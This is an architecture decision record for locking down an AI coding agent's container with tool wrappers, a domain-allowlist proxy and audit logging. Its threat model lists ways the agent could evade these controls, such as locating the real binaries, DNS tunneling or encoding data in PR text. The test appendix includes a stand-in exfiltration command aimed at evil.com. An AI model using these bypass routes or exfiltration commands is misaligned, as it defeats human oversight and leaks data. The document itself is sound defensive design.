# ADR: Internet and Tool Access Lockdown

**Driver:** James Wiesebron
**Approver:** TBD
**Contributors:** James Wiesebron, Claude (AI Pair Programming)
**Informed:** Engineering teams
**Proposed:** November 2025
**Status:** Draft

## Table of Contents

- [Context](#context)
- [Problem Statement](#problem-statement)
- [Decision](#decision)
- [High-Level Design](#high-level-design)
- [Implementation Details](#implementation-details)
- [Security Analysis](#security-analysis)
- [Consequences](#consequences)
- [Alternatives Considered](#alternatives-considered)
- [Migration Plan](#migration-plan)

## Context

### Background

The james-in-a-box container currently relies on behavioral instructions (CLAUDE.md) to prevent unauthorized actions like merging PRs or overwriting branches. While the container has network isolation (bridge mode, outbound only), the agent has unrestricted access to:

1. **Raw CLI tools**: `git`, `gh`, `curl`, `wget`, etc.
2. **Full internet access**: Any HTTP/HTTPS endpoint is reachable
3. **GitHub API**: Full permissions of the GITHUB_TOKEN

This creates risk vectors:
- Agent could merge PRs despite instructions not to
- Agent could push force to branches, potentially overwriting others' work
- Agent could exfiltrate data to arbitrary external endpoints
- Prompt injection attacks could bypass behavioral instructions

### Current Security Model

The existing ADR documents a "trust but verify" model:
- Agent has full tool access
- CLAUDE.md instructs agent not to merge PRs or force push
- Human reviews all PRs before merge
- Network isolation prevents inbound connections

**Gap:** Behavioral instructions are not enforceable. A sufficiently sophisticated prompt injection or model misbehavior could bypass these soft constraints.

## Problem Statement

**We need defense-in-depth that does not rely solely on the agent following instructions.**

Specific threats to address:

1. **Unauthorized PR merges**: Agent could merge its own PRs without human approval
2. **Destructive git operations**: Force push, branch deletion, history rewriting
3. **Data exfiltration**: Sending confidential data to external endpoints
4. **Credential abuse**: Using GITHUB_TOKEN for unintended operations
5. **Supply chain attacks**: Installing malicious packages

## Decision

**Implement a layered lockdown strategy using tool wrappers, PATH manipulation, and network filtering.**

### Core Principles

1. **Deny by default**: Block access unless explicitly allowed
2. **Wrapper-based access control**: Replace dangerous tools with controlled wrappers
3. **Network allowlist**: Only permit connections to known-safe endpoints
4. **Audit everything**: Log all tool invocations and network requests
5. **Fail closed**: If controls fail, deny access rather than permit

## High-Level Design

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                     james-in-a-box Container                          │
│                                                                       │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                        Agent (Claude)                          │  │
│  │                                                                 │  │
│  │  PATH=/jib/wrappers:$PATH                                      │  │
│  │                                                                 │  │
│  │  Sees: git-wrapper, gh-wrapper, curl-wrapper                   │  │
│  │  Hidden: /usr/bin/git, /usr/bin/gh, /usr/bin/curl              │  │
│  └─────────┬─────────────────────────────────────────────────────┘  │
│            │                                                          │
│            ▼                                                          │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    Tool Wrappers (/jib/wrappers/)              │  │
│  │                                                                 │  │
│  │  git      → validates commands, blocks force push, etc.        │  │
│  │  gh       → blocks merge, delete, admin operations             │  │
│  │  curl     → validates URLs against allowlist                   │  │
│  │  wget     → validates URLs against allowlist                   │  │
│  │  pip      → logs installs, optional allowlist                  │  │
│  │  npm      → logs installs, optional allowlist                  │  │
│  │                                                                 │  │
│  │  All wrappers: LOG to /var/log/jib/tool-access.log             │  │
│  └─────────┬─────────────────────────────────────────────────────┘  │
│            │                                                          │
│            ▼                                                          │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    Network Filter (Proxy/iptables)             │  │
│  │                                                                 │  │
│  │  Allowlist:                                                     │  │
│  │    - api.anthropic.com (Claude API)                            │  │
│  │    - api.github.com (PR creation, not merge)                   │  │
│  │    - pypi.org, npmjs.com (packages)                            │  │
│  │    - registry.npmjs.org                                        │  │
│  │    - files.pythonhosted.org                                    │  │
│  │                                                                 │  │
│  │  Blocked:                                                       │  │
│  │    - Everything else                                            │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### Component Summary

| Component | Purpose | Implementation |
|-----------|---------|----------------|
| Tool Wrappers | Block dangerous operations at command level | Shell scripts in /jib/wrappers/ |
| PATH Manipulation | Hide real tools, expose only wrappers | Container entrypoint |
| Network Filter | Block unauthorized outbound connections | HTTP proxy (squid) with domain allowlist |
| Audit Logging | Track all tool usage | Wrapper logging + proxy logs |

## Implementation Details

### 1. Tool Wrappers

#### Git Wrapper (`/jib/wrappers/git`)

```bash
#!/bin/bash
# /jib/wrappers/git - Controlled git wrapper

LOG_FILE="/var/log/jib/tool-access.log"
REAL_GIT="/usr/bin/git"

log_access() {
    echo "$(date -Is) GIT $$ $(whoami) $*" >> "$LOG_FILE"
}

block_operation() {
    local reason="$1"
    log_access "BLOCKED: $reason - args: $*"
    echo "ERROR: Operation blocked by security policy: $reason" >&2
    exit 1
}

# Parse git command
SUBCOMMAND="${1:-}"

case "$SUBCOMMAND" in
    push)
        # Check for force push flags
        for arg in "$@"; do
            case "$arg" in
                -f|--force|--force-with-lease)
                    block_operation "Force push not allowed"
                    ;;
                --delete)
                    block_operation "Remote branch deletion not allowed"
                    ;;
            esac
        done

        # Block push to main/master directly
        if echo "$@" | grep -qE '(origin\s+)?(main|master)(\s|$)'; then
            block_operation "Direct push to main/master not allowed"
        fi
        ;;

    branch)
        # Block remote branch deletion
        for arg in "$@"; do
            case "$arg" in
                -D|-d)
                    # Allow local branch deletion, but log it
                    log_access "WARNING: Local branch deletion"
                    ;;
            esac
        done
        ;;

    reset)
        # Block hard reset
        for arg in "$@"; do
            case "$arg" in
                --hard)
                    block_operation "Hard reset not allowed"
                    ;;
            esac
        done
        ;;

    rebase)
        # Allow rebase but warn
        log_access "WARNING: Rebase operation"
        ;;

    config)
        # Block global config changes
        for arg in "$@"; do
            case "$arg" in
                --global|--system)
                    block_operation "Global/system git config not allowed"
                    ;;
            esac
        done
        ;;
esac

# Log and execute
log_access "ALLOWED: $*"
exec "$REAL_GIT" "$@"
```

#### GitHub CLI Wrapper (`/jib/wrappers/gh`)

The gh wrapper enforces ownership-based access control:
- **Can** create PRs, create comments on any PR
- **Can** close/edit only jib's own PRs
- **Can** edit/delete only jib's own comments
- **Cannot** merge any PR (human must merge)
- **Cannot** modify other users' PRs or comments

```bash
#!/bin/bash
# /jib/wrappers/gh - Controlled GitHub CLI wrapper with ownership checks

LOG_FILE="/var/log/jib/tool-access.log"
REAL_GH="/usr/bin/gh"

# jib's GitHub username (configured at container start)
JIB_USERNAME="${JIB_GITHUB_USERNAME:-jib-bot}"

log_access() {
    echo "$(date -Is) GH $$ $(whoami) $*" >> "$LOG_FILE"
}

block_operation() {
    local reason="$1"
    shift
    log_access "BLOCKED: $reason - args: $*"
    echo "ERROR: Operation blocked by security policy: $reason" >&2
    exit 1
}

# Check if jib owns a PR (by PR number)
is_own_pr() {
    local pr_number="$1"
    local author
    author=$("$REAL_GH" pr view "$pr_number" --json author --jq '.author.login' 2>/dev/null)
    [[ "$author" == "$JIB_USERNAME" ]]
}

# Check if jib owns a comment (by comment ID)
is_own_comment() {
    local comment_id="$1"
    local repo="$2"
    local author
    # PR comments are in issues API
    author=$("$REAL_GH" api "repos/$repo/issues/comments/$comment_id" --jq '.user.login' 2>/dev/null)
    [[ "$author" == "$JIB_USERNAME" ]]
}

# Extract PR number from arguments (handles various gh pr subcommand formats)
extract_pr_number() {
    for arg in "$@"; do
        if [[ "$arg" =~ ^[0-9]+$ ]]; then
            echo "$arg"
            return
        fi
    done
}

# Parse gh command
SUBCOMMAND="${1:-}"
SUBSUBCOMMAND="${2:-}"

case "$SUBCOMMAND" in
    pr)
        case "$SUBSUBCOMMAND" in
            merge)
                block_operation "PR merge not allowed - human must merge"
                ;;

            close|reopen)
                # Only allow on jib's own PRs
                pr_num=$(extract_pr_number "${@:3}")
                if [[ -z "$pr_num" ]]; then
                    block_operation "PR number required for $SUBSUBCOMMAND"
                fi
                if ! is_own_pr "$pr_num"; then
                    block_operation "Can only $SUBSUBCOMMAND own PRs (PR #$pr_num not owned by $JIB_USERNAME)"
                fi
                log_access "ALLOWED: $SUBSUBCOMMAND own PR #$pr_num"
                ;;

            edit)
                # Only allow editing jib's own PRs
                pr_num=$(extract_pr_number "${@:3}")
                if [[ -z "$pr_num" ]]; then
                    block_operation "PR number required for edit"
                fi
                if ! is_own_pr "$pr_num"; then
                    block_operation "Can only edit own PRs (PR #$pr_num not owned by $JIB_USERNAME)"
                fi
                log_access "ALLOWED: edit own PR #$pr_num"
                ;;

            create)
                # Always allowed - jib can create new PRs
                log_access "ALLOWED: PR create"
                ;;

            comment)
                # Creating comments is allowed on any PR
                log_access "ALLOWED: PR comment (create)"
                ;;

            review)
                # Reviews are allowed (equivalent to comments)
                log_access "ALLOWED: PR review"
                ;;

            view|list|checkout|diff|ready|checks|status)
                # Read-only operations always allowed
                ;;

            *)
                log_access "WARNING: Unknown PR subcommand: $SUBSUBCOMMAND"
                ;;
        esac
        ;;

    issue)
        case "$SUBSUBCOMMAND" in
            delete)
                block_operation "Issue deletion not allowed"
                ;;
            comment)
                # Creating comments allowed
                log_access "ALLOWED: Issue comment (create)"
                ;;
            create|view|list|close|reopen|edit)
                # These are generally safe for issues
                ;;
        esac
        ;;

    repo)
        case "$SUBSUBCOMMAND" in
            delete|archive|rename|edit)
                block_operation "Repo modification not allowed"
                ;;
            clone|view|list|fork)
                # Safe operations
                ;;
            *)
                log_access "WARNING: Unknown repo subcommand: $SUBSUBCOMMAND"
                ;;
        esac
        ;;

    auth)
        case "$SUBSUBCOMMAND" in
            logout|refresh)
                block_operation "Auth modification not allowed"
                ;;
            status|setup-git)
                # Safe operations
                ;;
        esac
        ;;

    api)
        # API calls need careful inspection
        # Block merge operations
        if echo "$@" | grep -qE 'pulls/[0-9]+/merge'; then
            block_operation "PR merge via API not allowed"
        fi

        # Allow read-only API calls
        if ! echo "$@" | grep -qiE '(-X\s*(POST|PUT|PATCH|DELETE)|--method\s*(POST|PUT|PATCH|DELETE))'; then
            # GET request - allowed
            log_access "ALLOWED: API GET request"
        else
            # Mutation - check if it's a safe operation
            if echo "$@" | grep -qE 'issues/[0-9]+/comments$'; then
                # Creating a comment - allowed
                log_access "ALLOWED: API create comment"
            elif echo "$@" | grep -qE 'pulls/[0-9]+/reviews$'; then
                # Creating a review - allowed
                log_access "ALLOWED: API create review"
            elif echo "$@" | grep -qE 'issues/comments/[0-9]+'; then
                # Editing/deleting a comment - need ownership check
                # Extract comment ID and check ownership
                log_access "WARNING: API comment mutation - ownership not verified at wrapper level"
                # Note: Full ownership check would require parsing the URL and making an API call
                # For now, log and allow - can be tightened later
            else
                block_operation "API mutation not in allowlist"
            fi
        fi
        ;;

    secret|variable|ssh-key|gpg-key)
        block_operation "Secret/key management not allowed"
        ;;

    release)
        case "$SUBSUBCOMMAND" in
            create|delete|edit)
                block_operation "Release management not allowed"
                ;;
            list|view|download)
                # Safe operations
                ;;
        esac
        ;;

    *)
        # Unknown top-level command - log but allow (fail open for unknown)
        log_access "WARNING: Unknown gh command: $SUBCOMMAND"
        ;;
esac

# Log and execute
log_access "ALLOWED: $*"
exec "$REAL_GH" "$@"
```

**Configuration Required:**
- Set `JIB_GITHUB_USERNAME` environment variable to jib's GitHub username
- The wrapper makes API calls to verify ownership, so network must allow GitHub API access

#### HTTP Client Wrapper (`/jib/wrappers/curl`)

```bash
#!/bin/bash
# /jib/wrappers/curl - URL-filtered curl wrapper

LOG_FILE="/var/log/jib/tool-access.log"
REAL_CURL="/usr/bin/curl"

# Allowlisted domains (regex patterns)
ALLOWED_DOMAINS=(
    'api\.anthropic\.com'
    'api\.github\.com'
    'github\.com'
    'raw\.githubusercontent\.com'
    'pypi\.org'
    'files\.pythonhosted\.org'
    'registry\.npmjs\.org'
    'npmjs\.com'
    'dl\.google\.com'           # Go packages
    'proxy\.golang\.org'
    'storage\.googleapis\.com'  # Various package mirrors
    'objects\.githubusercontent\.com'  # GitHub release assets
)

log_access() {
    echo "$(date -Is) CURL $$ $(whoami) $*" >> "$LOG_FILE"
}

block_url() {
    local url="$1"
    log_access "BLOCKED URL: $url"
    echo "ERROR: URL blocked by security policy: $url" >&2
    echo "Allowed domains: ${ALLOWED_DOMAINS[*]}" >&2
    exit 1
}

extract_domain() {
    local url="$1"
    echo "$url" | sed -E 's|^https?://||' | sed -E 's|/.*||' | sed -E 's|:.*||'
}

is_allowed_domain() {
    local domain="$1"
    for pattern in "${ALLOWED_DOMAINS[@]}"; do
        if echo "$domain" | grep -qE "^${pattern}$"; then
            return 0
        fi
    done
    return 1
}

# Find URLs in arguments
for arg in "$@"; do
    if echo "$arg" | grep -qE '^https?://'; then
        domain=$(extract_domain "$arg")
        if ! is_allowed_domain "$domain"; then
            block_url "$arg"
        fi
    fi
done

# Log and execute
log_access "ALLOWED: $*"
exec "$REAL_CURL" "$@"
```

### 2. PATH Manipulation

Configure in container entrypoint or `.bashrc`:

```bash
# /jib/setup-path.sh - Called at container start

# Wrapper directory takes precedence
export PATH="/jib/wrappers:$PATH"

# Create symlinks for common tool aliases
ln -sf /jib/wrappers/curl /jib/wrappers/wget 2>/dev/null || true

# Hide real binaries from casual discovery (optional)
# Note: This doesn't prevent direct path access, just makes discovery harder
alias which='which -a 2>/dev/null | grep -v /usr/bin || which'
```

### 3. Network Filtering (HTTP Proxy)

**Decision:** Use an HTTP proxy with domain allowlist for network filtering.

This approach was chosen over iptables because:
- Works with domain names, not IPs (handles CDNs, load balancers)
- Can inspect and log request details
- Easier to update allowlist without container restart
- Can enforce additional policies (rate limiting, request size)
- No CAP_NET_ADMIN capability required in container

#### Proxy Configuration

```yaml
# docker-compose.yml addition
services:
  jib-proxy:
    image: squid:latest
    volumes:
      - ./proxy/squid.conf:/etc/squid/squid.conf:ro
      - ./proxy/allowlist.txt:/etc/squid/allowlist.txt:ro
    networks:
      - jib-net

  jib-container:
    # ... existing config ...
    environment:
      - HTTP_PROXY=http://jib-proxy:3128
      - HTTPS_PROXY=http://jib-proxy:3128
      - NO_PROXY=localhost,127.0.0.1
    depends_on:
      - jib-proxy
```

```
# /proxy/squid.conf
acl allowlist dstdomain "/etc/squid/allowlist.txt"
acl SSL_ports port 443
acl Safe_ports port 443

http_access allow allowlist
http_access deny all

# Logging
access_log /var/log/squid/access.log
```

```
# /proxy/allowlist.txt
.anthropic.com
.github.com
.githubusercontent.com
.pypi.org
.pythonhosted.org
.npmjs.org
.npmjs.com
.golang.org
.googleapis.com
```

**Benefits of proxy approach:**
- Works with domain names, not IPs
- Can inspect and log request details
- Easier to update allowlist without container restart
- Can enforce additional policies (rate limiting, request size)

### 4. Hiding Real Binaries

For defense in depth, make real binaries harder to discover:

```bash
# Option 1: Use filesystem permissions (requires root at build time)
chmod 700 /usr/bin/git /usr/bin/gh /usr/bin/curl

# Option 2: Move to hidden location
mv /usr/bin/git /usr/lib/jib-hidden/git
ln -s /jib/wrappers/git /usr/bin/git

# Option 3: Use AppArmor/SELinux profile (most robust)
# See security-profile.md for full profile
```

### 5. Additional Hardening

#### Prevent Python/Node from Making Direct HTTP Calls

```bash
# /jib/wrappers/python
#!/bin/bash
# Inject proxy settings into Python environment
export HTTP_PROXY=http://jib-proxy:3128
export HTTPS_PROXY=http://jib-proxy:3128
export REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
exec /usr/bin/python3 "$@"
```

#### Block Raw Socket Access

```bash
# In container seccomp profile or AppArmor
# Deny: socket(AF_INET, SOCK_RAW, ...)
# This prevents bypassing proxy via raw sockets
```

## Security Analysis

### Threat Model

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Agent merges own PR | `gh pr merge` blocked | LOW - Would need to bypass wrapper |
| Force push to branches | `git push -f` blocked | LOW - Would need direct /usr/bin/git |
| Data exfiltration via curl | Domain allowlist | MEDIUM - Could use Python requests if proxy bypassed |
| Exfil via DNS tunneling | Rate limit DNS, consider DNS proxy | LOW - Slow, detectable |
| Package supply chain | Log all installs, optional allowlist | MEDIUM - Trust package registries |
| Prompt injection bypass | All mitigations are code, not instructions | LOW - Hard to bypass compiled controls |
| Direct binary access | Hide binaries, filesystem permissions | MEDIUM - Determined attacker could find |

### What This Does NOT Prevent

1. **Malicious code in PRs**: Agent can still write malicious code that passes tests (human review required)
2. **Information in PR descriptions**: Agent could embed encoded data in PR text (DLP scanning needed)
3. **Package-based exfiltration**: Malicious package could phone home during install
4. **Social engineering via Slack**: Agent could attempt to manipulate human via messages

### Defense in Depth Summary

```
Layer 1: Behavioral (CLAUDE.md instructions)
    ↓ Can be bypassed by prompt injection
Layer 2: Tool Wrappers (this ADR)
    ↓ Can be bypassed by finding real binaries
Layer 3: Network Filter
    ↓ Can be bypassed by DNS tunneling or allowed endpoints
Layer 4: Filesystem Permissions
    ↓ Can be bypassed by root access (which container doesn't have)
Layer 5: Human Review
    ↓ Final safety net - human must approve all changes
```

## Consequences

### Positive

- **Enforceable controls**: Security doesn't rely on agent following instructions
- **Audit trail**: All tool usage logged
- **Reduced attack surface**: Only necessary network access permitted
- **Defense in depth**: Multiple layers must be bypassed for harm
- **Transparent**: Easy to review what's allowed/blocked

### Negative

- **Increased complexity**: More infrastructure to maintain
- **Potential breakage**: Legitimate operations might be blocked
- **Performance overhead**: Wrapper scripts add latency
- **Proxy complexity**: HTTPS interception requires certificate management
- **Maintenance burden**: Allowlists need updates when services change

### Trade-offs

| Aspect | Without Lockdown | With Lockdown |
|--------|------------------|---------------|
| Setup complexity | Simple | Moderate |
| Runtime overhead | None | ~10-50ms per tool call |
| Flexibility | High | Restricted |
| Security | Behavioral only | Enforced |
| Debugging | Easy | May need allowlist updates |

## Alternatives Considered

### Alternative 1: Rely on Token Scoping Only

**Approach:** Use GitHub tokens with minimal permissions (no merge, no delete)

**Pros:**
- Simpler implementation
- GitHub enforces permissions

**Cons:**
- Doesn't address data exfiltration
- Doesn't protect git operations
- Single point of failure (token)

**Rejected:** Insufficient coverage - only addresses GitHub, not general network/tool access

### Alternative 2: Full VM Isolation

**Approach:** Run agent in VM with no network except through bastion

**Pros:**
- Strongest isolation
- Can use standard security tools

**Cons:**
- Much higher resource usage
- Slower startup
- More complex management

**Rejected:** Overkill for current threat model; Docker + wrappers sufficient

### Alternative 3: Read-Only Filesystem + API-Only Output

**Approach:** Agent can only read code, writes via API to host service

**Pros:**
- No direct file modification
- All outputs through controlled API

**Cons:**
- Major architecture change
- Loses many Claude Code capabilities
- Slow iteration

**Rejected:** Too disruptive; loses value of Claude Code's direct editing

### Alternative 4: Runtime Monitoring Instead of Prevention

**Approach:** Allow all operations but detect and alert on suspicious activity

**Pros:**
- No false positives blocking legitimate work
- Learn what "normal" looks like

**Cons:**
- Damage done before detection
- Hard to define "suspicious"
- Alert fatigue

**Rejected:** Prevention preferred over detection for high-risk operations like PR merge

## MCP Considerations

**Related ADR:** [ADR-Context-Sync-Strategy-Custom-vs-MCP](./ADR-Context-Sync-Strategy-Custom-vs-MCP.md) (PR #36)

The MCP strategy ADR proposes migrating GitHub operations from the `gh` CLI to the **GitHub MCP Server**. This significantly changes the lockdown approach for GitHub operations.

### Current vs MCP Architecture

**Current (gh CLI):**
```
Agent → gh wrapper → gh CLI → GitHub API
         ↑
    Lockdown point
```

**With MCP:**
```
Agent → Claude Code MCP Client → GitHub MCP Server → GitHub API
                                        ↑
                                  Lockdown point shifts here
```

### Lockdown Strategy with MCP

When MCP is adopted, the lockdown shifts from CLI wrappers to **MCP server configuration and token scoping**:

| Lockdown Layer | CLI Approach | MCP Approach |
|----------------|--------------|--------------|
| Tool blocking | gh wrapper blocks `gh pr merge` | Disable `merge_pull_request` tool in MCP config |
| Ownership checks | Wrapper calls API to verify | MCP server config + OAuth scopes |
| Audit logging | Wrapper logs to file | MCP server logs + Claude Code logs |
| Network filtering | Proxy allowlist | Same - MCP server needs network access |

### MCP Tool Allowlist

The GitHub MCP Server exposes these tools. Recommended allowlist for jib:

| Tool | Status | Rationale |
|------|--------|-----------|
| `create_pull_request` | ✅ Allow | Core workflow |
| `add_issue_comment` | ✅ Allow | PR comments, reviews |
| `get_issue` | ✅ Allow | Read-only |
| `search_issues` | ✅ Allow | Read-only |
| `get_file_contents` | ✅ Allow | Read-only |
| `merge_pull_request` | ❌ Block | Human must merge |
| `delete_branch` | ❌ Block | Destructive |
| `create_or_update_file` | ⚠️ Conditional | Only on jib's branches |
| `push_files` | ⚠️ Conditional | Only on jib's branches |

### Implementation Options for MCP Lockdown

**Option 1: MCP Server Configuration**

Configure Claude Code to only enable specific MCP tools:

```json
// ~/.claude/settings.json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}"
      },
      "tools": {
        "allow": [
          "create_pull_request",
          "add_issue_comment",
          "get_issue",
          "search_issues",
          "get_file_contents"
        ]
      }
    }
  }
}
```

**Option 2: MCP Proxy Gateway**

For more complex rules (ownership checks, conditional access), deploy a custom MCP proxy:

```
Agent → Claude Code → MCP Proxy → GitHub MCP Server → GitHub API
                         ↑
                   Ownership checks,
                   merge blocking,
                   audit logging
```

The proxy would:
- Intercept MCP tool calls
- Apply ownership validation (only allow operations on jib's resources)
- Block prohibited operations (merge)
- Log all requests

**Option 3: GitHub Token Scoping**

Use a fine-grained Personal Access Token with minimal permissions:

| Permission | Setting | Effect |
|------------|---------|--------|
| `contents` | write | Can create branches, commits |
| `pull_requests` | write | Can create PRs, comments |
| `issues` | write | Can comment on issues |
| `metadata` | read | Required for API access |
| `administration` | none | Cannot change repo settings |
| `actions` | none | Cannot trigger workflows |

**Note:** Token scoping alone cannot prevent PR merge (which only requires `pull_requests:write`), so must be combined with Option 1 or 2.

### Recommended Approach

**Phase 1 (Current - CLI):** Use gh wrapper as documented in this ADR

**Phase 2 (MCP Migration):** When adopting MCP per ADR-Context-Sync-Strategy:
1. Start with MCP tool allowlist (Option 1)
2. Add token scoping (Option 3) as defense-in-depth
3. Evaluate MCP proxy (Option 2) if ownership checks prove necessary

### GCP Deployment Considerations

**Related ADR:** ADR references in PR #44

For Cloud Run deployment, the lockdown architecture adapts:

| Component | Local (Current) | GCP (Future) |
|-----------|-----------------|--------------|
| Tool wrappers | Container filesystem | Same (baked into image) |
| Network proxy | Docker sidecar | Cloud Run sidecar or VPC egress rules |
| Audit logs | File + stdout | Cloud Logging |
| MCP servers | Local process | Network service or sidecar |

**GCP-Specific Controls:**

1. **VPC Service Controls:** Can restrict which APIs the container can reach
2. **Cloud Armor:** WAF rules for outbound traffic (if using proxy)
3. **IAM:** Service account scoping for any GCP resources
4. **Audit Logs:** Cloud Logging for all egress traffic

**Proxy in GCP:**

The squid proxy approach works well in GCP:
- Deploy as Cloud Run sidecar
- Or use Serverless VPC Access + Cloud NAT with egress rules
- Squid config can be stored in Secret Manager

```yaml
# Cloud Run service with proxy sidecar
apiVersion: serving.knative.dev/v1
kind: Service
spec:
  template:
    spec:
      containers:
      - name: jib
        env:
        - name: HTTP_PROXY
          value: "http://localhost:3128"
      - name: squid-proxy
        image: gcr.io/project/jib-proxy
        ports:
        - containerPort: 3128
```

## Migration Plan

### Phase 1: Logging Only (Week 1)

1. Deploy wrappers that LOG but don't BLOCK
2. Analyze logs to establish baseline
3. Identify any legitimate use of "dangerous" operations
4. Tune allowlists based on observed traffic

### Phase 2: Soft Enforcement (Week 2)

1. Enable blocking with override flag (`--jib-allow`)
2. Monitor blocked operations
3. Update allowlists for legitimate traffic
4. Document any workflow changes needed

### Phase 3: Hard Enforcement (Week 3+)

1. Remove override flag
2. Enable network filtering
3. Full audit logging
4. Update CLAUDE.md to explain new constraints

### Rollback Plan

If lockdown causes too many issues:
1. Disable wrapper PATH override (single line change)
2. Keep logging enabled for visibility
3. Re-evaluate specific problematic controls

---

## Appendix A: Complete Wrapper Implementation

[Link to jib-container/wrappers/ directory with full implementations]

## Appendix B: Network Allowlist Maintenance

```bash
# /jib/scripts/update-allowlist.sh
# Run periodically to refresh IP-based rules

#!/bin/bash
set -e

DOMAINS=(
    api.anthropic.com
    api.github.com
    github.com
    pypi.org
    # ... etc
)

for domain in "${DOMAINS[@]}"; do
    ips=$(dig +short "$domain" | grep -E '^[0-9]+\.')
    echo "$domain: $ips"
done
```

## Appendix C: Testing the Lockdown

```bash
# Test suite for verifying lockdown is effective

# Should succeed
git status
git commit -m "test"
gh pr create --title "Test"
curl https://api.github.com/user

# Should fail
git push --force origin main        # Blocked: force push
gh pr merge 123                     # Blocked: merge
curl https://evil.com/exfil        # Blocked: not in allowlist
/usr/bin/git push --force          # Blocked: permissions
```

---

## Related ADRs

| ADR | Relationship |
|-----|--------------|
| [ADR-Autonomous-Software-Engineer](./ADR-Autonomous-Software-Engineer.md) | Parent ADR - defines overall security model this ADR enhances |
| [ADR-Context-Sync-Strategy-Custom-vs-MCP](./ADR-Context-Sync-Strategy-Custom-vs-MCP.md) (PR #36) | Proposes MCP for GitHub/Jira - changes lockdown approach |
| ADR-GCP-Deployment-Terraform (PR #44 refs) | GCP deployment - lockdown must work in Cloud Run |

---

**Last Updated:** 2025-11-25
**Status:** Draft - Awaiting Review
